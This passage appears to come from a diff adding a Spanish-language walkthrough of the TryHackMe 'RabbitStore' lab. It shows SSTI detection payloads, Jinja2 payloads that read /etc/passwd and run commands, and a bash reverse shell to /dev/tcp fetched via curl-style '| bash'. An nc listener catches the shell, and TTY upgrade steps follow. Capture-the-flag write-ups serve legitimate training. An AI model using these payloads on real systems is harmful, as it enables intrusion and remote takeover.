@@ -425,3 +425,81 @@ El error se debe a que no se está enviando ningún dato y el formato no es JSON
 ![](/assets/images/thm-writeup-RabbitStore/parametro.png)
 
 ## SSTI (Server Side Template Injection)
+
+
+Todo lo que se introduce en el parámetro `username` se refleja en la respuesta así que probé un payload de SSTI `${{<%[%'\"}}%\\."` lo que provoco un error en le motor de plantillas 
+
+![](/assets/images/thm-writeup-RabbitStore/ssti.png)
+
+También puede probarse el payload: `(<{{;/*` el cual revela el nombre del usuario de la máquina
+
+![](/assets/images/thm-writeup-RabbitStore/az.png)
+
+Esto confirma una vulnerabilidad SSTI: envié {{7*7}} y la plantilla lo evaluó, devolviendo 49. 
+
+![](/assets/images/thm-writeup-RabbitStore/49.png)
+
+En este punto probé un payload para leer /etc/passwd, el cual funcionó correctamente.
+
+Payload: `{{ get_flashed_messages.__globals__.__builtins__.open("/etc/passwd").read() }}`
+
+`NOTA:` En JSON, las comillas dobles dentro de una cadena deben ir escapadas (`\"`).
+
+![](/assets/images/thm-writeup-RabbitStore/passwd.png)
+
+Intenté buscar llaves RSA de SSH para los usuarios azrael y root, pero no encontré ninguna, por lo que ejecuté un payload para ejecutar comandos.
+
+`{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}`
+
+![](/assets/images/thm-writeup-RabbitStore/id.png)
+
+Para obtener una reverse shell cree un archivo llamado r con el sig. contenido:
+
+```bash
+┌──(root㉿kali)-[/opt]
+└─# cat r         
+#!/bin/bash
+
+bash -i >& /dev/tcp/10.14.109.18/443 0>&1
+```
+Levanté un servidor temporal con Python y llamé a mi archivo agregando al final | bash para que se ejecutara.
+
+![](/assets/images/thm-writeup-RabbitStore/bash.png)
+
+```bash
+┌──(root㉿kali)-[/opt]
+└─# python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+10.201.3.199 - - [07/Sep/2025 10:36:20] "GET /r HTTP/1.1" 200 -
+```
+
+```bash
+┌──(root㉿kali)-[/home/kali]
+└─# nc -lvp 443
+listening on [any] 443 ...
+connect to [10.14.109.18] from cloudsite.thm [10.201.3.199] 53594
+bash: cannot set terminal process group (606): Inappropriate ioctl for device
+bash: no job control in this shell
+azrael@forge:~/chatbotServer$    
+```
+Para trabajar mas cómodo realice un tratamiento de la TTY
+
+```bash
+azrael@forge:~/chatbotServer$ script /dev/null -c bash
+script /dev/null -c bash
+Script started, output log file is '/dev/null'.
+azrael@forge:~/chatbotServer$ ^Z
+zsh: suspended  nc -lvp 443
+
+┌──(root㉿kali)-[/home/kali]
+└─# stty raw -echo;fg    
+[1]  + continued  nc -lvp 443
+                             reset 
+reset: unknown terminal type unknown
+Terminal type? xterm
+
+azrael@forge:~/chatbotServer$ export TERM=xterm
+azrael@forge:~/chatbotServer$ export SHELL=bash
+azrael@forge:~/chatbotServer$ 
+```
+## Escalada de Privilegios
